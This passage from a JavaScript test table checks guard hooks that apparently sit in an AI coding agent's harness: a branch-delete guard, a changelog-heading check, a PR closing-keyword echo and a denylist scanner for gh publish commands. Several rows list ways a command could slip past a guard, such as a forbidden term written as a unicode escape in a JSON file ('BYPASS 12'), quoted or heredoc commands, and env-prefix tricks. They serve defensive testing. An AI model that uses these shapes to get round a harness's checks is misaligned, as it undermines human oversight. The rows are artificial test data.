  msg: "is BLIND and ALLOWED this delete",
  note: "the GitHub CLI is off PATH, so spawn errors rather than exits - the other half of the fail-open branch" });
row({ id: "bd-a04", guard: "branch-delete", cwd: "dev", gh: "garbage", cmd: "git branch -D feat/x", expect: "WARN",
  msg: "could not parse",
  note: "gh answers non-JSON - fails if the guard treats unparsable output as no open PR (a silent ALLOW)" });
row({ id: "bd-a05", guard: "branch-delete", cwd: "dev", gh: "open",
  cmd: "cat > f <<'EOF'" + NL + "Run " + BT + "git branch -D feat/x" + BT + " only after MERGED." + NL + "EOF && gh issue comment 5 --body-file f",
  expect: "ALLOW", note: "the quoted-command shape on this guard - prose QUOTING the delete must not deny" });
row({ id: "bd-a06", guard: "branch-delete", cwd: "dev", gh: "open",
  cmd: "gh issue create --body \"we still git branch -D feat/x by hand\"", expect: "ALLOW",
  note: "quoted-argument prose - fails if command-position anchoring was lost" });
row({ id: "bd-a07", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch -m feat/x feat/y", expect: "ALLOW",
  note: "a RENAME - fails if any short flag reads as a delete (-m carries no d/D)" });
row({ id: "bd-a08", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git push origin feat/x", expect: "ALLOW",
  note: "an ordinary push - fails if push without --delete or a leading colon reads as a delete" });
row({ id: "bd-a09", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git push origin feat/x:feat/x", expect: "ALLOW",
  note: "a src:dst refspec - fails if the colon test stopped requiring the colon to be LEADING" });
row({ id: "bd-a10", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "git branch --list -a", expect: "ALLOW",
  note: "listing branches - fails if a delete is inferred from the subcommand alone" });
row({ id: "bd-a11", guard: "branch-delete", cwd: "dev", gh: "open", cmd: "echo hello world", expect: "ALLOW",
  note: "CONTROL - fails if the guard denies (or speaks) unconditionally" });
row({ id: "bd-a12", guard: "branch-delete", cwd: "dev", gh: "open", stdinShape: "garbage", cmd: "(garbage stdin)",
  expect: "ALLOW", note: "fail-open posture - fails if the try/catch around the JSON parse was lost" });

// ---- changelog-heading (SHIPPED): a vanished heading must WARN, never DENY -
// `state` restages the changelog fixture per row (see clState). These rows are the only ones whose
// verdict depends on repo CONTENT rather than the command string, so the state is set immediately
// before the guard fires and never assumed.
// These score the shipped form, which is NOT a standalone guard: the heading check is a
// clause appended to the shipped CHANGELOG entry guard, whose date echo speaks (WARN) on EVERY commit
// carrying the changelog - and whose date clause says "MISMATCH" too whenever the fixture's entry
// date is not today. So the verdict alone cannot discriminate here: the WARN rows pin text only the
// heading clause emits (HD_TEXT), and the correct-bump control pins its ABSENCE (`absent`) instead
// of expecting silence. A bare `msg: "MISMATCH"` would have scored the date clause and stayed green
// with the heading clause dead.
const HD_TEXT = "heading(s) present in HEAD:CHANGELOG.md but missing from the ";
row({ id: "ch-w01", guard: "changelog-heading", cwd: "changelog", state: "replaced", cmd: "git commit -m x",
  expect: "WARN", msg: HD_TEXT + "staged file",
  note: "CONTROL - the clobbered-heading failure itself (0.2.0 overwritten by the new heading); fails if the guard never ran or the heading clause stopped comparing" });
row({ id: "ch-w02", guard: "changelog-heading", cwd: "changelog", state: "replaced", cmd: "git commit -m x",
  expect: "WARN", msg: HD_TEXT + "staged file: 0.2.0",
  note: "fails if the MISMATCH does not NAME the vanished heading - an unnamed warning cannot be acted on" });
row({ id: "ch-w03", guard: "changelog-heading", cwd: "changelog", state: "unstaged-replaced", cmd: "git commit -am x",
  expect: "WARN", msg: HD_TEXT + "working-tree file",
  note: "nothing staged, -a sweeps it in - fails if the allFlag/working-tree path broke for the heading clause" });
row({ id: "ch-a01", guard: "changelog-heading", cwd: "changelog", state: "added", cmd: "git commit -m x", expect: "WARN",
  absent: HD_TEXT,
  note: "CONTROL - a CORRECT bump (0.3.0 inserted above) draws only the date echo; fails if the heading clause fires on every changelog commit" });
row({ id: "ch-a02", guard: "changelog-heading", cwd: "changelog", state: "other", cmd: "git commit -m x", expect: "ALLOW",
  note: "the changelog is not in the commit - fails if the guard stopped checking what is actually staged" });
row({ id: "ch-a03", guard: "changelog-heading", cwd: "changelog", state: "unstaged-replaced", cmd: "git commit -m x",
  expect: "ALLOW", note: "a vanished heading NOT in this commit (no -a) - fails if the allFlag test widened to every commit" });
row({ id: "ch-a04", guard: "changelog-heading", cwd: "changelog", state: "replaced", cmd: "git log", expect: "ALLOW",
  note: "not a commit at all - fails if the verb match widened past commit" });
row({ id: "ch-a05", guard: "changelog-heading", cwd: "changelog", state: "replaced",
  cmd: "cat > f <<'EOF'" + NL + "git commit -m x" + NL + "EOF && gh issue comment 5 --body-file f", expect: "ALLOW",
  note: "the quoted-command shape - a heredoc quoting the commit must not make this guard speak" });
row({ id: "ch-a06", guard: "changelog-heading", cwd: "dev", state: "replaced", cmd: "git commit -m x", expect: "ALLOW",
  note: "a repo with no changelog and no HEAD copy of one - fails if a missing HEAD:<file> stops reading as silence" });

// ---- closing-echo (SHIPPED): echo the closing keywords of the PR the merge itself names ----
// An advisory hook - it never denies, so every verdict is WARN (it spoke) or ALLOW (silent), and the
// WARN rows pin `msg` because a WARN naming the WRONG PR must fail: a verdict-only row
// would score it green. `gh: "view"` answers `pr view <n>` with "Closes #<n>" (so the text names
// the PR actually fetched) and the no-number form as the current branch's PR #7 (see GH_STUB_SRC).
// Unnumbered merges resolve the current branch's PR only when every argument is a flag and nothing
// (cd, -R/--repo, an env prefix) could point gh somewhere else; otherwise it is "could not parse".
const CE_CUR = "(PR #7, resolved from the current branch): Fixes #7";
const CE_CNP = "could not parse a PR number from this merge command";
row({ id: "ce-w01", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42",
  note: "CONTROL - a numbered merge; fails if the hook never ran, the anchor broke, or gh pr view stopped being asked for 42" });
// For an o/r URL the hook must ask gh for the URL itself, not keep only the number and view #42 in
// the hook cwd's repo.
row({ id: "ce-w02", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge https://github.com/o/r/pull/42 --squash",
  expect: "WARN", msg: "(PR #42 in o/r): Closes o/r#42",
  note: "the URL form - fails if /pull/<n> stopped being read, or the URL's repo is dropped and #42 fetched from the hook cwd's repo" });
row({ id: "ce-w03", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge \"#42\" --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", note: "a QUOTED #42 reaches gh as #42 - fails if quotes are not stripped off the token" });
row({ id: "ce-w04", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge #42 --squash", expect: "WARN",
  msg: CE_CUR, absent: "(PR #42)",
  note: "an UNQUOTED #42 starts a bash comment, so gh merges the current branch's PR - fails if the comment is read as an argument" });
row({ id: "ce-w05", guard: "closing-echo", cwd: "dev", gh: "view",
  cmd: "gh pr merge --squash --auto && for i in $(seq 1 12); do sleep 5; done", expect: "WARN", msg: CE_CUR, absent: "(PR #1)",
  note: "CONTROL - a merge followed by an unrelated command; fails if the number search runs past the merge command's own segment (it would echo PR #1)" });
row({ id: "ce-w06", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge --squash --auto 2>&1 | tee merge.log",
  expect: "WARN", msg: CE_CUR, note: "a redirection in the segment - fails if 2> or the pipe's right side reads as an argument" });
row({ id: "ce-w07", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_PROMPT_DISABLED=1 gh pr merge 42 --squash",
  expect: "WARN", msg: "(PR #42): Closes #42", note: "an env-assignment prefix - fails if the command-position anchor stopped admitting one" });
row({ id: "ce-w08", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "bash <<'EOF'" + NL + "gh pr merge 42 --squash" + NL + "EOF",
  expect: "WARN", msg: "(PR #42): Closes #42", note: "an EXECUTED heredoc body - fails if this copy of the heredoc helper strips it" });
row({ id: "ce-w09", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge feat/x --squash", expect: "WARN",
  msg: CE_CNP, note: "a branch-name argument - fails if it is ignored and the CURRENT branch's PR is echoed instead" });
row({ id: "ce-w10", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "cd ../other && gh pr merge --squash", expect: "WARN",
  msg: CE_CNP, note: "a cd before the merge - fails if the current branch is resolved from the hook cwd, which is not where gh runs" });
row({ id: "ce-w11", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge --squash -R o/r", expect: "WARN",
  msg: CE_CNP, note: "another repo - fails if -R is ignored and this checkout's branch PR is echoed" });
row({ id: "ce-w12", guard: "closing-echo", cwd: "dev", gh: "fail", cmd: "gh pr merge --squash --auto", expect: "WARN",
  msg: "(the current-branch PR): gh failed to fetch the PR body",
  note: "gh errors (no PR for the branch) - fails if a gh failure goes silent or throws into the fail-open catch" });
// A NUMBERED merge naming another repo must fetch that number FROM that repo: a hook that
// drops -R/--repo echoes #<n> of the hook cwd's repo - a different PR's body, a false "clean"
// (or a false alarm) for the merge actually being armed. Each form below fails on such a hook.
const CE_RR = "(PR #42 in o/r): Closes o/r#42";
row({ id: "ce-w13", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 -R o/r --squash", expect: "WARN",
  msg: CE_RR, note: "CONTROL - -R <repo>; fails if the repo is dropped and #42 is fetched from the hook cwd's repo" });
row({ id: "ce-w14", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 --repo o/r --squash", expect: "WARN",
  msg: CE_RR, note: "--repo <repo> - fails if the long flag's separate value is not read" });
row({ id: "ce-w15", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 --repo=o/r --squash", expect: "WARN",
  msg: CE_RR, note: "--repo=<repo> - fails if the attached long-flag value is not read" });
row({ id: "ce-w16", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge -R o/r 42 --squash", expect: "WARN",
  msg: CE_RR, note: "the flag BEFORE the number - fails if only flags after the number are read" });
row({ id: "ce-w17", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 -Ro/r --squash", expect: "WARN",
  msg: CE_RR, note: "-R<repo> attached - fails if the short flag's attached value is not read" });
row({ id: "ce-w18", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 -sR o/r", expect: "WARN",
  msg: CE_RR, note: "-R bundled behind the boolean -s - fails if a bundled shorthand hides the repo" });
row({ id: "ce-w19", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 -tRelease --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", note: "an R inside -t's attached subject is not -R - fails if the bundle match admits a value-taking shorthand" });
// the two other ways a merge names another repo - a GH_REPO env prefix and a PR URL. Same defect as
// above (a hook viewing #<n> in the hook cwd's repo); each row fails on such a hook. Precedence follows real gh
// (merge shares the PR finder):
// -R beats GH_REPO; a PR URL beats BOTH -R and GH_REPO. `absent` pins that the losing repo never surfaces.
row({ id: "ce-w20", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=o/r gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "CONTROL - a GH_REPO env prefix; fails if it is parsed but never passed on (fetched from the hook cwd's repo)" });
row({ id: "ce-w21", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=\"o/r\" gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "a double-quoted GH_REPO value - fails if the quotes ride along into -R" });
row({ id: "ce-w22", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO='o/r' gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "a single-quoted GH_REPO value - fails if the quotes ride along into -R" });
row({ id: "ce-w23", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=a/b GH_REPO=o/r gh pr merge 42 --squash",
  expect: "WARN", msg: CE_RR, absent: "a/b", note: "the prefix repeated - the LAST assignment wins, as in the shell" });
row({ id: "ce-w24", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=a/b gh pr merge 42 -R o/r --squash",
  expect: "WARN", msg: CE_RR, absent: "a/b", note: "-R beats GH_REPO - fails if the env value overrides the flag" });
row({ id: "ce-w25", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=a/b gh pr merge https://github.com/o/r/pull/42",
  expect: "WARN", msg: CE_RR, absent: "a/b", note: "a PR URL beats GH_REPO - fails if the env value is tagged or passed over the URL" });
row({ id: "ce-w26", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge https://github.com/o/r/pull/42 -R x/y",
  expect: "WARN", msg: CE_RR, absent: "x/y", note: "a PR URL beats -R - fails if the flag's repo is tagged instead of the URL's" });
row({ id: "ce-w27", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "FOO=GH_REPO=z/z gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "z/z", note: "GH_REPO inside ANOTHER variable's value is not GH_REPO - fails if the env match is unanchored" });
// the GH_HOST env prefix, same defect class as GH_REPO - a hook spawning `gh pr view` against the
// cwd's host. The hook forwards the value through the spawned gh's env and lets gh apply its own precedence
// (no host logic in the hook), so the stub models gh 2.101.0 precedence (see GH_STUB_SRC) and
// the host surfaces as a `<host>/` prefix on the echoed repo. The tag deliberately never names the host.
const CE_H = "(PR #42): Closes h.example/#42";
const CE_HRR = "(PR #42 in o/r): Closes h.example/o/r#42";
row({ id: "ce-w28", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "CONTROL - a GH_HOST env prefix; fails if it is parsed but never forwarded (fetched from the hook cwd's host)" });
row({ id: "ce-w29", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=\"h.example\" gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "a double-quoted GH_HOST value - fails if the quotes ride along into the forwarded host" });
row({ id: "ce-w30", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST='h.example' gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "a single-quoted GH_HOST value - fails if the quotes ride along into the forwarded host" });
row({ id: "ce-w31", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=a.example GH_HOST=h.example gh pr merge 42 --squash",
  expect: "WARN", msg: CE_H, absent: "a.example", note: "the prefix repeated - the LAST assignment wins, as in the shell" });
row({ id: "ce-w32", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example gh pr merge 42 -R o/r --squash",
  expect: "WARN", msg: CE_HRR, note: "a 2-part -R takes its host from GH_HOST - fails if the host is forwarded only without -R" });
row({ id: "ce-w33", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example gh pr merge 42 -R x.example/o/r --squash",
  expect: "WARN", msg: "(PR #42 in x.example/o/r): Closes x.example/o/r#42", absent: "h.example",
  note: "a HOST/OWNER/REPO -R beats GH_HOST - fails if the hook overrides gh's own precedence with the env host" });
row({ id: "ce-w34", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example gh pr merge https://github.com/o/r/pull/42",
  expect: "WARN", msg: CE_RR, absent: "h.example", note: "a PR URL beats GH_HOST - fails if the env host is forced over the URL's own" });
row({ id: "ce-w35", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example GH_REPO=o/r gh pr merge 42 --squash",
  expect: "WARN", msg: CE_HRR, note: "a 2-part GH_REPO takes its host from GH_HOST - fails if the host is dropped once a repo is named" });
row({ id: "ce-w36", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "FOO=GH_HOST=z.example gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "z.example", note: "GH_HOST inside ANOTHER variable's value is not GH_HOST - fails if the env match is unanchored" });
row({ id: "ce-w37", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST= gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", note: "an EMPTY GH_HOST is unset - fails only if the empty value breaks parsing (the stub, like gh, reads an empty host as none, so a forwarded \"\" is invisible here)" });
// GH_REPO / GH_HOST set EARLIER in the same command (sibling cases). Each in ONE
// `bash -c` against gh + bash: a BARE `GH_REPO=v;` is an unexported shell variable gh never sees, so it must NOT
// apply (so scanning for a bare assignment is wrong); `export GH_REPO=v` and `GH_REPO=v; export
// GH_REPO` do apply; re-assigning an already-exported variable keeps the export (the later value applies); an inline
// prefix beats an earlier export; -R beats an exported GH_REPO; a PR URL beats both; `env VAR=v gh ...` is an inline
// prefix; an export inside ( ) or $( ) does not leak out. Only text BEFORE the merge counts. `absent` pins the loser.
row({ id: "ce-w38", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=o/r; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "CONTROL - an earlier export; fails if only the merge's own inline prefix is read (fetched from the hook cwd's repo)" });
row({ id: "ce-w39", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=\"o/r\" && gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "a double-quoted exported value, joined by && - fails if the quotes ride along into -R" });
row({ id: "ce-w40", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO='o/r'; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "a single-quoted exported value - fails if the quotes ride along into -R" });
row({ id: "ce-w41", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=o/r; export GH_REPO; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "assign, then export by name - fails if a later `export NAME` does not promote the earlier value" });
row({ id: "ce-w42", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_REPO=a/b; gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "a/b", note: "a BARE unexported assignment is invisible to gh - fails if it is read as exported, or as the merge's inline prefix" });
row({ id: "ce-w43", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=a/b; GH_REPO=o/r gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, absent: "a/b", note: "the inline prefix beats an earlier export - fails if the earlier value is preferred" });
row({ id: "ce-w44", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=a/b; gh pr merge 42 -R o/r --squash", expect: "WARN",
  msg: CE_RR, absent: "a/b", note: "-R beats an exported GH_REPO - fails if the earlier export overrides the flag" });
row({ id: "ce-w45", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=a/b; gh pr merge https://github.com/o/r/pull/42", expect: "WARN",
  msg: CE_RR, absent: "a/b", note: "a PR URL beats an exported GH_REPO - fails if the earlier export is tagged or passed over the URL" });
row({ id: "ce-w46", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "echo hi" + NL + "export GH_REPO=o/r" + NL + "gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "the export on an earlier LINE - fails if the scan stops at the merge's own line" });
row({ id: "ce-w47", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 --squash; export GH_REPO=o/r", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "o/r", note: "an export AFTER the merge cannot reach it - fails if the scan reads past the merge" });
row({ id: "ce-w48", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=a/b; GH_REPO=o/r; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, absent: "a/b", note: "re-assigning an exported variable keeps it exported, last value wins - fails if the bare re-assignment is dropped" });
row({ id: "ce-w49", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "(export GH_REPO=o/r); gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "o/r", note: "an export inside a ( ) group does not leak out - fails if parentheses are not scoped" });
row({ id: "ce-w50", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "echo \"x; export GH_REPO=o/r\"; gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "o/r", note: "an export inside a QUOTED string is data - fails if quoted separators split the scan" });
row({ id: "ce-w51", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=o/r; gh pr merge --squash", expect: "WARN",
  msg: CE_CNP, absent: "(PR #7", note: "an unnumbered merge with an earlier export is NOT the cwd's current-branch PR - fails if the current-branch fetch ignores the export" });
row({ id: "ce-w52", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "env GH_REPO=o/r gh pr merge 42 --squash", expect: "WARN",
  msg: CE_RR, note: "the `env VAR=v gh ...` form is an inline prefix - fails if `env` at command position stops matching (the hook stays silent)" });
row({ id: "ce-w53", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=h.example; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "CONTROL - an earlier GH_HOST export (an exported GH_HOST is honoured) - fails if only the inline prefix is forwarded" });
row({ id: "ce-w54", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=\"h.example\"; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "a quoted exported GH_HOST - fails if the quotes ride along into the forwarded host" });
row({ id: "ce-w55", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=h.example; export GH_HOST; gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "GH_HOST assigned, then exported by name - fails if a later `export NAME` does not promote the earlier value" });
row({ id: "ce-w56", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "GH_HOST=z.example; gh pr merge 42 --squash", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "z.example", note: "a BARE unexported GH_HOST is invisible to gh - fails if it is forwarded" });
row({ id: "ce-w57", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=a.example; GH_HOST=h.example gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, absent: "a.example", note: "the inline GH_HOST beats an earlier export - fails if the earlier value is preferred" });
row({ id: "ce-w58", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=h.example; gh pr merge 42 -R o/r --squash", expect: "WARN",
  msg: CE_HRR, note: "an earlier GH_HOST export supplies the host of a 2-part -R (a 2-part -R takes GH_HOST)" });
row({ id: "ce-w59", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=h.example; gh pr merge 42 -R x.example/o/r --squash", expect: "WARN",
  msg: "(PR #42 in x.example/o/r): Closes x.example/o/r#42", absent: "h.example", note: "a HOST/OWNER/REPO -R beats an earlier GH_HOST export - fails if gh's precedence is overridden" });
row({ id: "ce-w60", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr merge 42 --squash; export GH_HOST=h.example", expect: "WARN",
  msg: "(PR #42): Closes #42", absent: "h.example", note: "a GH_HOST export AFTER the merge cannot reach it - fails if the scan reads past the merge" });
row({ id: "ce-w61", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "env GH_HOST=h.example gh pr merge 42 --squash", expect: "WARN",
  msg: CE_H, note: "the `env GH_HOST=v gh ...` form - fails if `env` at command position stops matching" });
row({ id: "ce-w62", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "env GH_REPO=o/r GH_HOST=h.example gh pr merge 42 --squash", expect: "WARN",
  msg: CE_HRR, note: "both variables through `env` - fails if either is dropped" });
row({ id: "ce-w63", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_REPO=o/r" + NL + "export GH_HOST=h.example" + NL + "gh pr merge 42 --squash",
  expect: "WARN", msg: CE_HRR, note: "both exported on earlier lines - fails if the scan stops after the first variable" });
row({ id: "ce-w64", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "export GH_HOST=h.example; gh pr merge --squash", expect: "WARN",
  msg: CE_CNP, absent: "(PR #7", note: "an unnumbered merge with an earlier GH_HOST export is NOT the cwd's current-branch PR - fails if the current-branch fetch ignores it" });
row({ id: "ce-a01", guard: "closing-echo", cwd: "dev", gh: "view",
  cmd: "gh issue comment 5 --body \"armed it with gh pr merge --squash --auto, then seq 1 12\"", expect: "ALLOW",
  note: "merge words inside a quoted argument; fails if command-position anchoring was lost" });
row({ id: "ce-a02", guard: "closing-echo", cwd: "dev", gh: "view",
  cmd: "cat > f <<'EOF'" + NL + "gh pr merge --squash --auto" + NL + "seq 1 12" + NL + "EOF", expect: "ALLOW",
  note: "a merge line inside a DATA heredoc; only the body strip can allow this, the newline anchor fires otherwise" });
row({ id: "ce-a03", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "gh pr view 42", expect: "ALLOW",
  note: "not a merge - fails if the verb match widened" });
row({ id: "ce-a04", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "echo hello world", expect: "ALLOW",
  note: "CONTROL - fails if the hook speaks unconditionally" });
row({ id: "ce-a05", guard: "closing-echo", cwd: "dev", gh: "view", stdinShape: "garbage", cmd: "(garbage stdin)",
  expect: "ALLOW", note: "fail-soft posture - fails if the try/catch around the JSON parse was lost" });
row({ id: "ce-a06", guard: "closing-echo", cwd: "dev", gh: "view", cmd: "echo env gh pr merge 42", expect: "ALLOW",
  note: "`env` is only a command-position prefix - fails if the widened merge anchor admits merge words in an echo's arguments" });

// ---- gh-publish denylist scan (Bash and PowerShell entries) --------------------------------------
// The hook blocks through exit code 2, so DENY here means "exit 2 + the reason on stderr". Row fields:
// `dl` picks the denylist the run sees (ok | missing | empty | xdg | home), `scanner: "absent"` points
// CLAUDE_PROJECT_DIR at a dir with no scripts/, `tool` overrides the tool_name. The fixture dir is `ghscan`
// and its denylist holds GS_TERMS; every row's output is also checked for those terms (see runRows).
// The scan has two tiers (see scripts/denylist-scan.js): TIER A, a command that is exactly ONE gh invocation (at most
// one `cd` before it) in the strict word grammar, whose text must come from a file; TIER B, everything else that
// mentions gh, which is only searched for gh invocations and blocks any that publish. Every DENY row pins the
// scanner's OWN message (`msg`), so a block for another reason cannot score as the match.
const G = (x, f) => fwd(x.ghscan) + "/" + f;
// A path as the strict form accepts it: bare when it holds only strict-form characters, else single-quoted (a temp dir
// can hold ~ or spaces).
const GP = (x, f) => { const p = G(x, f); return /^[A-Za-z0-9._\/:=@-]+$/.test(p) ? p : "'" + p + "'"; };
const NATIVE = (x, f) => path.join(x.ghscan, f);
const NP = (x, f) => "'" + NATIVE(x, f) + "'";
const ctr = {};
const mkRow = (guard, pre) => (expect, cmd, note, o) => {
  const k = pre + (expect === "DENY" ? "d" : "a");
  ctr[k] = (ctr[k] || 0) + 1;
  row(Object.assign({ id: k + String(ctr[k]).padStart(2, "0"), guard: guard, cwd: "ghscan", cmd: cmd, expect: expect, note: note }, o || {}));
};
const gb = mkRow("gh-scan-bash", "gb-");
const gp = mkRow("gh-scan-ps", "gp-");
const TA = "Bowsprit-Ledger";
const TB = "MAELSTROM roster";
const MB = { msg: "must be the only command in the call" };
const MI = { msg: "inline body or notes text is not accepted" };
const BSL = String.fromCharCode(92);
const BT2 = String.fromCharCode(96);
const SHA = "0123456789abcdef0123456789abcdef01234567";

// ===== TIER A: one gh invocation, text from a file ================================================
gb("DENY", (x) => "gh issue comment 5 --body-file " + GP(x, "dirty.md"),
  "CONTROL - a body FILE's contents and the hit's line number; fails if the hook never ran, never reads the denylist, matches case-sensitively, or does not read files",
  { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh issue comment 5 -F dirty.md",
  "a RELATIVE body file resolves against the hook JSON cwd (no cd before it) - fails if it resolves against the hook's own cwd", { msg: "(file contents), line 3" });
gb("DENY", "gh issue comment 5 --body-file=dirty.md", "the --flag=value form", { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh issue comment 5 -Fdirty.md", "a short flag with its value attached", { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh issue comment 5 -F 'dirty.md'", "a single-quoted path", { msg: "(file contents), line 3" });
gb("DENY", "gh issue comment 5 -F \"dirty.md\"", "a double-quoted path", { msg: "(file contents), line 3" });
gb("DENY", "gh release create v1 --title t --notes-file dirty.md", "release --notes-file", { msg: "--notes-file (file contents), line 3" });
gb("DENY", "gh pr create -t x -F dirty.md", "pr create -F", { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh issue new -t x -F dirty.md", "the `new` alias of issue create, with a body file", { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh pr merge 5 --squash --body-file dirty.md", "pr merge builds its commit message from the body", { msg: "--body-file (file contents), line 3" });
gb("DENY", "gh pr create -t x --template dirty.md", "a pr create template FILE is scanned like a body file", { msg: "--template (file contents), line 3" });
gb("DENY", "gh pr create -t x --template=dirty.md", "the --template=file form", { msg: "--template (file contents), line 3" });
gb("DENY", "gh pr create -t x -T no-such-file.md", "an unreadable template file blocks", { msg: "missing or unreadable" });
gb("DENY", "gh api repos/o/r/issues -F body=@dirty.md", "gh api -F key=@file", { msg: "gh api -F #1 (file contents), line 3" });
gb("DENY", "gh api repos/o/r/issues --input dirty.json", "gh api --input <file>: raw scan (the second fixture term, in a JSON body)", { msg: "gh api --input (file contents), line 1" });
gb("DENY", "gh api repos/o/r/issues --input recover-esc.json",
  "BYPASS 12 - a JSON --input whose term is written with a unicode escape: only the DECODED strings show it - fails if only the raw file is scanned", { msg: "gh api --input (decoded), line " });
gb("DENY", "gh api repos/o/r/issues --input recover-bad.json", "an --input file that is not JSON cannot be read reliably, so it blocks", { msg: "not valid JSON" });
gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-dirty.json", "a recover file holding the term (raw scan)", { msg: "--recover (file contents), line 1" });
gb("DENY", "gh issue create -t x --body-file clean.md --recover recover-esc.json", "a recover file with an escaped term: decoded scan", { msg: "--recover (decoded), line " });
